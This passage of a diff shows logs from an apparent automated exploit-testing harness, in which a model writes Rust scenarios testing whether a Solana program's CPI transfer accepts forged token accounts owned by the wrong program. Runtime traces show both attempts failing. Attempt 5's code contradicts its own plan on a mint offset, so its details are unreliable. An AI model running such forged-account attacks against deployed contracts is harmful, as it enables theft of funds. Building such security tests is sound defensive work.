+                "post": "000000000000000400000000000000000000000000000000000000000000000000000000000000030000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
+              },
+              {
+                "key": "11111112D1oxKts8YPdTJRG5FzxTNpMtWmq8hkVx3",
+                "signer": true,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              },
+              {
+                "key": "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA",
+                "signer": false,
+                "writable": false,
+                "owner": "BPFLoaderUpgradeab1e11111111111111111111111",
+                "data_len": 36,
+                "head": "0200000027f190b1",
+                "digest": "5b31219b7bc4060b",
+                "post": ""
+              }
+            ]
+          }
+        ],
+        "runtime_trace": [
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA invoke [2]",
+          "Program TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA failed: invalid account data for instruction",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 3407 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS failed: invalid account data for instruction",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA invoke [2]",
+          "Program TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA failed: invalid account data for instruction",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 3407 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS failed: invalid account data for instruction"
+        ],
+        "elapsed_s": 1.8
+      },
+      "verdict": null,
+      "reason": "o baseline 'transferencia legitima via CPI' falhou com Failure(InvalidAccountData); o uso legitimo precisa ter sucesso (revise layout das contas, seeds, flags de assinatura/escrita e argumentos)"
+    },
+    {
+      "attempt": 4,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 3644,
+        "completion_tokens": 1649,
+        "latency_s": 6.07
+      },
+      "raw": "{\"plan\": \"O baseline falhou com InvalidAccountData porque a conta de mint nao foi passada como conta da instrucao (o SPL Token precisa dela para validar source/destination) e o layout do mint estava incorreto. Vou montar mint, source e destination com layout SPL Token correto (mint com authority COption, supply, decimals, is_initialized; contas de token com mint, owner, amount, state) e incluir o mint nas contas e metas. O baseline faz um transfer legitimo entre contas SPL Token; o ataque repete a mesma chamada mas com source/destination cujo dono e o programa-alvo (nao o SPL Token), testando se a falta de checagem de owner permite aceitar contas forjadas.\", \"scenario\": \"let env = Env::load();\\n\\nlet spl_token_id = solana_program::pubkey!(\\\"TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA\\\");\\nlet authority = Pubkey::new_unique();\\nlet mint = Pubkey::new_unique();\\n\\n// Mint SPL Token valido: COption<Pubkey> mint_authority = None, supply, decimals, is_initialized\\nlet mut mint_data = vec![0u8; 82];\\nmint_data[0..4].copy_from_slice(&0u32.to_le_bytes()); // mint_authority = None\\nmint_data[4..12].copy_from_slice(&1000u64.to_le_bytes()); // supply\\nmint_data[12] = 0; // decimals\\nmint_data[13] = 1; // is_initialized\\nlet mint_account = account(&spl_token_id, &mint_data, None);\\n\\n// Conta de token source: mint, owner, amount, state=initialized\\nlet mut source_data = vec![0u8; 165];\\nsource_data[0..32].copy_from_slice(mint.as_ref());\\nsource_data[32..64].copy_from_slice(authority.as_ref());\\nsource_data[64..72].copy_from_slice(&1000u64.to_le_bytes());\\nsource_data[108] = 1; // state = initialized\\nlet source_legit = Pubkey::new_unique();\\nlet source_legit_account = account(&spl_token_id, &source_data, None);\\n\\n// Conta de token destination: mint, owner, amount=0, state=initialized\\nlet mut dest_data = vec![0u8; 165];\\ndest_data[0..32].copy_from_slice(mint.as_ref());\\ndest_data[32..64].copy_from_slice(authority.as_ref());\\ndest_data[64..72].copy_from_slice(&0u64.to_le_bytes());\\ndest_data[108] = 1;\\nlet dest_legit = Pubkey::new_unique();\\nlet dest_legit_account = account(&spl_token_id, &dest_data, None);\\n\\nlet authority_account = wallet(1_000_000_000);\\nlet token_program_account = program_account(&spl_token_id);\\n\\nlet contas_baseline = vec![\\n    (source_legit, source_legit_account.clone()),\\n    (dest_legit, dest_legit_account.clone()),\\n    (authority, authority_account.clone()),\\n    (spl_token_id, token_program_account.clone()),\\n    (mint, mint_account.clone()),\\n];\\n\\nlet ix_baseline = env.anchor_ix(\\n    \\\"cpi\\\",\\n    &(100u64,),\\n    vec![\\n        AccountMeta::new(source_legit, false),\\n        AccountMeta::new(dest_legit, false),\\n        AccountMeta::new_readonly(authority, true),\\n        AccountMeta::new_readonly(spl_token_id, false),\\n        AccountMeta::new_readonly(mint, false),\\n    ],\\n);\\n\\nlet r_baseline = env.baseline(\\\"transferencia legitima via CPI\\\", &ix_baseline, &contas_baseline);\\n\\n// Ataque: source/destination com dono diferente do SPL Token (dono = programa-alvo)\\nlet source_forged = Pubkey::new_unique();\\nlet dest_forged = Pubkey::new_unique();\\n\\nlet mut source_forged_data = vec![0u8; 165];\\nsource_forged_data[0..32].copy_from_slice(mint.as_ref());\\nsource_forged_data[32..64].copy_from_slice(authority.as_ref());\\nsource_forged_data[64..72].copy_from_slice(&1000u64.to_le_bytes());\\nsource_forged_data[108] = 1;\\nlet source_forged_account = account(&env.program_id, &source_forged_data, None);\\n\\nlet mut dest_forged_data = vec![0u8; 165];\\ndest_forged_data[0..32].copy_from_slice(mint.as_ref());\\ndest_forged_data[32..64].copy_from_slice(authority.as_ref());\\ndest_forged_data[64..72].copy_from_slice(&0u64.to_le_bytes());\\ndest_forged_data[108] = 1;\\nlet dest_forged_account = account(&env.program_id, &dest_forged_data, None);\\n\\nlet contas_ataque = vec![\\n    (source_forged, source_forged_account.clone()),\\n    (dest_forged, dest_forged_account.clone()),\\n    (authority, authority_account.clone()),\\n    (spl_token_id, token_program_account.clone()),\\n    (mint, mint_account.clone()),\\n];\\n\\nlet ix_ataque = env.anchor_ix(\\n    \\\"cpi\\\",\\n    &(100u64,),\\n    vec![\\n        AccountMeta::new(source_forged, false),\\n        AccountMeta::new(dest_forged, false),\\n        AccountMeta::new_readonly(authority, true),\\n        AccountMeta::new_readonly(spl_token_id, false),\\n        AccountMeta::new_readonly(mint, false),\\n    ],\\n);\\n\\nlet r_ataque = env.attack(\\\"CPI com contas forjadas de dono diferente\\\", &ix_ataque, &contas_ataque);\\n\\nif r_ataque.program_result == ProgramResult::Success {\\n    let source_after = after(&r_ataque, &source_forged);\\n    let dest_after = after(&r_ataque, &dest_forged);\\n    env.effect(\\n        \\\"conta forjada aceita com dono diferente do SPL Token\\\",\\n        source_after.owner() != &spl_token_id || dest_after.owner() != &spl_token_id,\\n    );\\n    env.effect(\\n        \\\"saldo da conta forjada foi alterado pela CPI\\\",\\n        read_u64(source_after.data(), 64) != 1000u64 || read_u64(dest_after.data(), 64) != 0u64,\\n    );\\n}\"}",
+      "plan": "O baseline falhou com InvalidAccountData porque a conta de mint nao foi passada como conta da instrucao (o SPL Token precisa dela para validar source/destination) e o layout do mint estava incorreto. Vou montar mint, source e destination com layout SPL Token correto (mint com authority COption, supply, decimals, is_initialized; contas de token com mint, owner, amount, state) e incluir o mint nas contas e metas. O baseline faz um transfer legitimo entre contas SPL Token; o ataque repete a mesma chamada mas com source/destination cujo dono e o programa-alvo (nao o SPL Token), testando se a falta de checagem de owner permite aceitar contas forjadas.",
+      "scenario": "let env = Env::load();\n\nlet spl_token_id = solana_program::pubkey!(\"TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA\");\nlet authority = Pubkey::new_unique();\nlet mint = Pubkey::new_unique();\n\n// Mint SPL Token valido: COption<Pubkey> mint_authority = None, supply, decimals, is_initialized\nlet mut mint_data = vec![0u8; 82];\nmint_data[0..4].copy_from_slice(&0u32.to_le_bytes()); // mint_authority = None\nmint_data[4..12].copy_from_slice(&1000u64.to_le_bytes()); // supply\nmint_data[12] = 0; // decimals\nmint_data[13] = 1; // is_initialized\nlet mint_account = account(&spl_token_id, &mint_data, None);\n\n// Conta de token source: mint, owner, amount, state=initialized\nlet mut source_data = vec![0u8; 165];\nsource_data[0..32].copy_from_slice(mint.as_ref());\nsource_data[32..64].copy_from_slice(authority.as_ref());\nsource_data[64..72].copy_from_slice(&1000u64.to_le_bytes());\nsource_data[108] = 1; // state = initialized\nlet source_legit = Pubkey::new_unique();\nlet source_legit_account = account(&spl_token_id, &source_data, None);\n\n// Conta de token destination: mint, owner, amount=0, state=initialized\nlet mut dest_data = vec![0u8; 165];\ndest_data[0..32].copy_from_slice(mint.as_ref());\ndest_data[32..64].copy_from_slice(authority.as_ref());\ndest_data[64..72].copy_from_slice(&0u64.to_le_bytes());\ndest_data[108] = 1;\nlet dest_legit = Pubkey::new_unique();\nlet dest_legit_account = account(&spl_token_id, &dest_data, None);\n\nlet authority_account = wallet(1_000_000_000);\nlet token_program_account = program_account(&spl_token_id);\n\nlet contas_baseline = vec![\n    (source_legit, source_legit_account.clone()),\n    (dest_legit, dest_legit_account.clone()),\n    (authority, authority_account.clone()),\n    (spl_token_id, token_program_account.clone()),\n    (mint, mint_account.clone()),\n];\n\nlet ix_baseline = env.anchor_ix(\n    \"cpi\",\n    &(100u64,),\n    vec![\n        AccountMeta::new(source_legit, false),\n        AccountMeta::new(dest_legit, false),\n        AccountMeta::new_readonly(authority, true),\n        AccountMeta::new_readonly(spl_token_id, false),\n        AccountMeta::new_readonly(mint, false),\n    ],\n);\n\nlet r_baseline = env.baseline(\"transferencia legitima via CPI\", &ix_baseline, &contas_baseline);\n\n// Ataque: source/destination com dono diferente do SPL Token (dono = programa-alvo)\nlet source_forged = Pubkey::new_unique();\nlet dest_forged = Pubkey::new_unique();\n\nlet mut source_forged_data = vec![0u8; 165];\nsource_forged_data[0..32].copy_from_slice(mint.as_ref());\nsource_forged_data[32..64].copy_from_slice(authority.as_ref());\nsource_forged_data[64..72].copy_from_slice(&1000u64.to_le_bytes());\nsource_forged_data[108] = 1;\nlet source_forged_account = account(&env.program_id, &source_forged_data, None);\n\nlet mut dest_forged_data = vec![0u8; 165];\ndest_forged_data[0..32].copy_from_slice(mint.as_ref());\ndest_forged_data[32..64].copy_from_slice(authority.as_ref());\ndest_forged_data[64..72].copy_from_slice(&0u64.to_le_bytes());\ndest_forged_data[108] = 1;\nlet dest_forged_account = account(&env.program_id, &dest_forged_data, None);\n\nlet contas_ataque = vec![\n    (source_forged, source_forged_account.clone()),\n    (dest_forged, dest_forged_account.clone()),\n    (authority, authority_account.clone()),\n    (spl_token_id, token_program_account.clone()),\n    (mint, mint_account.clone()),\n];\n\nlet ix_ataque = env.anchor_ix(\n    \"cpi\",\n    &(100u64,),\n    vec![\n        AccountMeta::new(source_forged, false),\n        AccountMeta::new(dest_forged, false),\n        AccountMeta::new_readonly(authority, true),\n        AccountMeta::new_readonly(spl_token_id, false),\n        AccountMeta::new_readonly(mint, false),\n    ],\n);\n\nlet r_ataque = env.attack(\"CPI com contas forjadas de dono diferente\", &ix_ataque, &contas_ataque);\n\nif r_ataque.program_result == ProgramResult::Success {\n    let source_after = after(&r_ataque, &source_forged);\n    let dest_after = after(&r_ataque, &dest_forged);\n    env.effect(\n        \"conta forjada aceita com dono diferente do SPL Token\",\n        source_after.owner() != &spl_token_id || dest_after.owner() != &spl_token_id,\n    );\n    env.effect(\n        \"saldo da conta forjada foi alterado pela CPI\",\n        read_u64(source_after.data(), 64) != 1000u64 || read_u64(dest_after.data(), 64) != 0u64,\n    );\n}",
+      "run": {
+        "kind": "ran",
+        "events": [
+          {
+            "step": "setup",
+            "attacker_program": "1111111QLbz7JHiBTspS962RLKV8GndWFwiEaqKM"
+          },
+          {
+            "step": "setup",
+            "attacker_program": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh"
+          },
+          {
+            "step": "baseline",
+            "note": "transferencia legitima via CPI",
+            "result": "Failure(InvalidAccountData)",
+            "compute_units": 3651,
+            "account_flags": "-w,-w,sr,-r,-r",
+            "ix_head": "4cad065fb55d53ce",
+            "accounts": [
+              {
+                "key": "111111131h1vYVSYuKP6AhS86fbRdMw9XHiZAvAaj",
+                "signer": false,
+                "writable": true,
+                "owner": "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA",
+                "data_len": 165,
+                "head": "0000000000000004",
+                "digest": "ed5a61a324ab1726",
+                "post": "00000000000000040000000000000000000000000000000000000000000000000000000000000003000000000000000000000000000000000000000000000000e803000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
+              },
+              {
+                "key": "11111113R2cuenjG5nFubqX9Wzuukdin2YfGQVzu5",
+                "signer": false,
+                "writable": true,
+                "owner": "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA",
+                "data_len": 165,
+                "head": "0000000000000004",
+                "digest": "cfe07edda73017e4",
+                "post": "000000000000000400000000000000000000000000000000000000000000000000000000000000030000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
+              },
+              {
+                "key": "11111112D1oxKts8YPdTJRG5FzxTNpMtWmq8hkVx3",
+                "signer": true,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              },
+              {
+                "key": "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA",
+                "signer": false,
+                "writable": false,
+                "owner": "BPFLoaderUpgradeab1e11111111111111111111111",
+                "data_len": 36,
+                "head": "0200000027f190b1",
+                "digest": "5b31219b7bc4060b",
+                "post": ""
+              },
+              {
+                "key": "11111112cMQwSC9qirWGjZM6gLGwW69X22mqwLLGP",
+                "signer": false,
+                "writable": false,
+                "owner": "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA",
+                "data_len": 82,
+                "head": "00000000e8030000",
+                "digest": "28b259bb3e83b96d",
+                "post": ""
+              }
+            ]
+          },
+          {
+            "step": "attack",
+            "note": "CPI com contas forjadas de dono diferente",
+            "result": "Failure(InvalidAccountData)",
+            "compute_units": 3651,
+            "account_flags": "-w,-w,sr,-r,-r",
+            "ix_head": "4cad065fb55d53ce",
+            "accounts": [
+              {
+                "key": "11111113pNDtm61yGF8j2ycAwLEPsuWQXobye5qDR",
+                "signer": false,
+                "writable": true,
+                "owner": "Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS",
+                "data_len": 165,
+                "head": "0000000000000004",
+                "digest": "ed5a61a324ab1726",
+                "post": "00000000000000040000000000000000000000000000000000000000000000000000000000000003000000000000000000000000000000000000000000000000e803000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
+              },
+              {
+                "key": "11111114DhpssPJgSi1YU7hCMfYt1BJ334YgsffXm",
+                "signer": false,
+                "writable": true,
+                "owner": "Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS",
+                "data_len": 165,
+                "head": "0000000000000004",
+                "digest": "cfe07edda73017e4",
+                "post": "000000000000000400000000000000000000000000000000000000000000000000000000000000030000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
+              },
+              {
+                "key": "11111112D1oxKts8YPdTJRG5FzxTNpMtWmq8hkVx3",
+                "signer": true,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              },
+              {
+                "key": "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA",
+                "signer": false,
+                "writable": false,
+                "owner": "BPFLoaderUpgradeab1e11111111111111111111111",
+                "data_len": 36,
+                "head": "0200000027f190b1",
+                "digest": "5b31219b7bc4060b",
+                "post": ""
+              },
+              {
+                "key": "11111112cMQwSC9qirWGjZM6gLGwW69X22mqwLLGP",
+                "signer": false,
+                "writable": false,
+                "owner": "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA",
+                "data_len": 82,
+                "head": "00000000e8030000",
+                "digest": "28b259bb3e83b96d",
+                "post": ""
+              }
+            ]
+          }
+        ],
+        "runtime_trace": [
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA invoke [2]",
+          "Program TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA failed: invalid account data for instruction",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 3651 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS failed: invalid account data for instruction",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA invoke [2]",
+          "Program TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA failed: invalid account data for instruction",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 3651 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS failed: invalid account data for instruction"
+        ],
+        "elapsed_s": 1.9
+      },
+      "verdict": null,
+      "reason": "o baseline 'transferencia legitima via CPI' falhou com Failure(InvalidAccountData); o uso legitimo precisa ter sucesso (revise layout das contas, seeds, flags de assinatura/escrita e argumentos)"
+    },
+    {
+      "attempt": 5,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 3683,
+        "completion_tokens": 1787,
+        "latency_s": 6.91
+      },
+      "raw": "{\"plan\": \"O baseline falhou com InvalidAccountData porque o layout da conta de mint SPL Token estava incorreto (o campo is_initialized fica no offset 45, nao 13, e o layout e mint_authority(4+32), supply(8), decimals(1), is_initialized(1), freeze_authority(4+32)). Vou montar mint e contas de token com o layout correto do SPL Token (165 bytes para contas, 82 para mint) e usar o SPL Token program real. O baseline faz uma transferencia legitima entre contas de token validas; o ataque substitui source/destination por contas com o mesmo layout mas dono diferente do SPL Token (dono = programa-alvo), testando se a CPI aceita contas forjadas. O efeito mede se a conta forjada foi aceita e teve saldo alterado.\", \"scenario\": \"let env = Env::load();\\n\\nlet spl_token_id = solana_program::pubkey!(\\\"TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA\\\");\\nlet authority = Pubkey::new_unique();\\nlet mint = Pubkey::new_unique();\\n\\n// Mint SPL Token valido (82 bytes): mint_authority COption<Pubkey> (4+32), supply u64 (8), decimals u8 (1), is_initialized u8 (1), freeze_authority COption<Pubkey> (4+32)\\nlet mut mint_data = vec![0u8; 82];\\nmint_data[0..4].copy_from_slice(&0u32.to_le_bytes()); // mint_authority = None\\nmint_data[4..12].copy_from_slice(&1000u64.to_le_bytes()); // supply\\nmint_data[12] = 0; // decimals\\nmint_data[44] = 1; // is_initialized\\nmint_data[45..49].copy_from_slice(&0u32.to_le_bytes()); // freeze_authority = None\\nlet mint_account = account(&spl_token_id, &mint_data, None);\\n\\n// Conta de token source (165 bytes): mint (32), owner (32), amount u64 (8), delegate COption<Pubkey> (4+32), state u8 (1), is_native COption<u64> (4+8), delegated_amount u64 (8), close_authority COption<Pubkey> (4+32)\\nlet mut source_data = vec![0u8; 165];\\nsource_data[0..32].copy_from_slice(mint.as_ref());\\nsource_data[32..64].copy_from_slice(authority.as_ref());\\nsource_data[64..72].copy_from_slice(&1000u64.to_le_bytes());\\nsource_data[108] = 1; // state = initialized\\nlet source_legit = Pubkey::new_unique();\\nlet source_legit_account = account(&spl_token_id, &source_data, None);\\n\\n// Conta de token destination\\nlet mut dest_data = vec![0u8; 165];\\ndest_data[0..32].copy_from_slice(mint.as_ref());\\ndest_data[32..64].copy_from_slice(authority.as_ref());\\ndest_data[64..72].copy_from_slice(&0u64.to_le_bytes());\\ndest_data[108] = 1;\\nlet dest_legit = Pubkey::new_unique();\\nlet dest_legit_account = account(&spl_token_id, &dest_data, None);\\n\\nlet authority_account = wallet(1_000_000_000);\\nlet token_program_account = program_account(&spl_token_id);\\n\\nlet contas_baseline = vec![\\n    (source_legit, source_legit_account.clone()),\\n    (dest_legit, dest_legit_account.clone()),\\n    (authority, authority_account.clone()),\\n    (spl_token_id, token_program_account.clone()),\\n    (mint, mint_account.clone()),\\n];\\n\\nlet ix_baseline = env.anchor_ix(\\n    \\\"cpi\\\",\\n    &(100u64,),\\n    vec![\\n        AccountMeta::new(source_legit, false),\\n        AccountMeta::new(dest_legit, false),\\n        AccountMeta::new_readonly(authority, true),\\n        AccountMeta::new_readonly(spl_token_id, false),\\n        AccountMeta::new_readonly(mint, false),\\n    ],\\n);\\n\\nlet r_baseline = env.baseline(\\\"transferencia legitima via CPI\\\", &ix_baseline, &contas_baseline);\\n\\n// Ataque: source/destination com dono diferente do SPL Token (dono = programa-alvo)\\nlet source_forged = Pubkey::new_unique();\\nlet dest_forged = Pubkey::new_unique();\\n\\nlet mut source_forged_data = vec![0u8; 165];\\nsource_forged_data[0..32].copy_from_slice(mint.as_ref());\\nsource_forged_data[32..64].copy_from_slice(authority.as_ref());\\nsource_forged_data[64..72].copy_from_slice(&1000u64.to_le_bytes());\\nsource_forged_data[108] = 1;\\nlet source_forged_account = account(&env.program_id, &source_forged_data, None);\\n\\nlet mut dest_forged_data = vec![0u8; 165];\\ndest_forged_data[0..32].copy_from_slice(mint.as_ref());\\ndest_forged_data[32..64].copy_from_slice(authority.as_ref());\\ndest_forged_data[64..72].copy_from_slice(&0u64.to_le_bytes());\\ndest_forged_data[108] = 1;\\nlet dest_forged_account = account(&env.program_id, &dest_forged_data, None);\\n\\nlet contas_ataque = vec![\\n    (source_forged, source_forged_account.clone()),\\n    (dest_forged, dest_forged_account.clone()),\\n    (authority, authority_account.clone()),\\n    (spl_token_id, token_program_account.clone()),\\n    (mint, mint_account.clone()),\\n];\\n\\nlet ix_ataque = env.anchor_ix(\\n    \\\"cpi\\\",\\n    &(100u64,),\\n    vec![\\n        AccountMeta::new(source_forged, false),\\n        AccountMeta::new(dest_forged, false),\\n        AccountMeta::new_readonly(authority, true),\\n        AccountMeta::new_readonly(spl_token_id, false),\\n        AccountMeta::new_readonly(mint, false),\\n    ],\\n);\\n\\nlet r_ataque = env.attack(\\\"CPI com contas forjadas de dono diferente\\\", &ix_ataque, &contas_ataque);\\n\\nif r_ataque.program_result == ProgramResult::Success {\\n    let source_after = after(&r_ataque, &source_forged);\\n    let dest_after = after(&r_ataque, &dest_forged);\\n    env.effect(\\n        \\\"conta forjada aceita com dono diferente do SPL Token\\\",\\n        source_after.owner() != &spl_token_id || dest_after.owner() != &spl_token_id,\\n    );\\n    env.effect(\\n        \\\"saldo da conta forjada foi alterado pela CPI\\\",\\n        read_u64(source_after.data(), 64) != 1000u64 || read_u64(dest_after.data(), 64) != 0u64,\\n    );\\n}\"}",
+      "plan": "O baseline falhou com InvalidAccountData porque o layout da conta de mint SPL Token estava incorreto (o campo is_initialized fica no offset 45, nao 13, e o layout e mint_authority(4+32), supply(8), decimals(1), is_initialized(1), freeze_authority(4+32)). Vou montar mint e contas de token com o layout correto do SPL Token (165 bytes para contas, 82 para mint) e usar o SPL Token program real. O baseline faz uma transferencia legitima entre contas de token validas; o ataque substitui source/destination por contas com o mesmo layout mas dono diferente do SPL Token (dono = programa-alvo), testando se a CPI aceita contas forjadas. O efeito mede se a conta forjada foi aceita e teve saldo alterado.",
+      "scenario": "let env = Env::load();\n\nlet spl_token_id = solana_program::pubkey!(\"TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA\");\nlet authority = Pubkey::new_unique();\nlet mint = Pubkey::new_unique();\n\n// Mint SPL Token valido (82 bytes): mint_authority COption<Pubkey> (4+32), supply u64 (8), decimals u8 (1), is_initialized u8 (1), freeze_authority COption<Pubkey> (4+32)\nlet mut mint_data = vec![0u8; 82];\nmint_data[0..4].copy_from_slice(&0u32.to_le_bytes()); // mint_authority = None\nmint_data[4..12].copy_from_slice(&1000u64.to_le_bytes()); // supply\nmint_data[12] = 0; // decimals\nmint_data[44] = 1; // is_initialized\nmint_data[45..49].copy_from_slice(&0u32.to_le_bytes()); // freeze_authority = None\nlet mint_account = account(&spl_token_id, &mint_data, None);\n\n// Conta de token source (165 bytes): mint (32), owner (32), amount u64 (8), delegate COption<Pubkey> (4+32), state u8 (1), is_native COption<u64> (4+8), delegated_amount u64 (8), close_authority COption<Pubkey> (4+32)\nlet mut source_data = vec![0u8; 165];\nsource_data[0..32].copy_from_slice(mint.as_ref());\nsource_data[32..64].copy_from_slice(authority.as_ref());\nsource_data[64..72].copy_from_slice(&1000u64.to_le_bytes());\nsource_data[108] = 1; // state = initialized\nlet source_legit = Pubkey::new_unique();\nlet source_legit_account = account(&spl_token_id, &source_data, None);\n\n// Conta de token destination\nlet mut dest_data = vec![0u8; 165];\ndest_data[0..32].copy_from_slice(mint.as_ref());\ndest_data[32..64].copy_from_slice(authority.as_ref());\ndest_data[64..72].copy_from_slice(&0u64.to_le_bytes());\ndest_data[108] = 1;\nlet dest_legit = Pubkey::new_unique();\nlet dest_legit_account = account(&spl_token_id, &dest_data, None);\n\nlet authority_account = wallet(1_000_000_000);\nlet token_program_account = program_account(&spl_token_id);\n\nlet contas_baseline = vec![\n    (source_legit, source_legit_account.clone()),\n    (dest_legit, dest_legit_account.clone()),\n    (authority, authority_account.clone()),\n    (spl_token_id, token_program_account.clone()),\n    (mint, mint_account.clone()),\n];\n\nlet ix_baseline = env.anchor_ix(\n    \"cpi\",\n    &(100u64,),\n    vec![\n        AccountMeta::new(source_legit, false),\n        AccountMeta::new(dest_legit, false),\n        AccountMeta::new_readonly(authority, true),\n        AccountMeta::new_readonly(spl_token_id, false),\n        AccountMeta::new_readonly(mint, false),\n    ],\n);\n\nlet r_baseline = env.baseline(\"transferencia legitima via CPI\", &ix_baseline, &contas_baseline);\n\n// Ataque: source/destination com dono diferente do SPL Token (dono = programa-alvo)\nlet source_forged = Pubkey::new_unique();\nlet dest_forged = Pubkey::new_unique();\n\nlet mut source_forged_data = vec![0u8; 165];\nsource_forged_data[0..32].copy_from_slice(mint.as_ref());\nsource_forged_data[32..64].copy_from_slice(authority.as_ref());\nsource_forged_data[64..72].copy_from_slice(&1000u64.to_le_bytes());\nsource_forged_data[108] = 1;\nlet source_forged_account = account(&env.program_id, &source_forged_data, None);\n\nlet mut dest_forged_data = vec![0u8; 165];\ndest_forged_data[0..32].copy_from_slice(mint.as_ref());\ndest_forged_data[32..64].copy_from_slice(authority.as_ref());\ndest_forged_data[64..72].copy_from_slice(&0u64.to_le_bytes());\ndest_forged_data[108] = 1;\nlet dest_forged_account = account(&env.program_id, &dest_forged_data, None);\n\nlet contas_ataque = vec![\n    (source_forged, source_forged_account.clone()),\n    (dest_forged, dest_forged_account.clone()),\n    (authority, authority_account.clone()),\n    (spl_token_id, token_program_account.clone()),\n    (mint, mint_account.clone()),\n];\n\nlet ix_ataque = env.anchor_ix(\n    \"cpi\",\n    &(100u64,),\n    vec![\n        AccountMeta::new(source_forged, false),\n        AccountMeta::new(dest_forged, false),\n        AccountMeta::new_readonly(authority, true),\n        AccountMeta::new_readonly(spl_token_id, false),\n        AccountMeta::new_readonly(mint, false),\n    ],\n);\n\nlet r_ataque = env.attack(\"CPI com contas forjadas de dono diferente\", &ix_ataque, &contas_ataque);\n\nif r_ataque.program_result == ProgramResult::Success {\n    let source_after = after(&r_ataque, &source_forged);\n    let dest_after = after(&r_ataque, &dest_forged);\n    env.effect(\n        \"conta forjada aceita com dono diferente do SPL Token\",\n        source_after.owner() != &spl_token_id || dest_after.owner() != &spl_token_id,\n    );\n    env.effect(\n        \"saldo da conta forjada foi alterado pela CPI\",\n        read_u64(source_after.data(), 64) != 1000u64 || read_u64(dest_after.data(), 64) != 0u64,\n    );\n}",
+      "run": {
+        "kind": "ran",
+        "events": [
+          {
+            "step": "setup",
+            "attacker_program": "1111111QLbz7JHiBTspS962RLKV8GndWFwiEaqKM"
+          },
+          {
+            "step": "setup",
+            "attacker_program": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh"
+          },
+          {
+            "step": "baseline",
+            "note": "transferencia legitima via CPI",
+            "result": "Failure(InvalidAccountData)",
+            "compute_units": 3651,
+            "account_flags": "-w,-w,sr,-r,-r",
+            "ix_head": "4cad065fb55d53ce",
+            "accounts": [
+              {
+                "key": "111111131h1vYVSYuKP6AhS86fbRdMw9XHiZAvAaj",
+                "signer": false,
+                "writable": true,
+                "owner": "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA",
+                "data_len": 165,
+                "head": "0000000000000004",
+                "digest": "ed5a61a324ab1726",
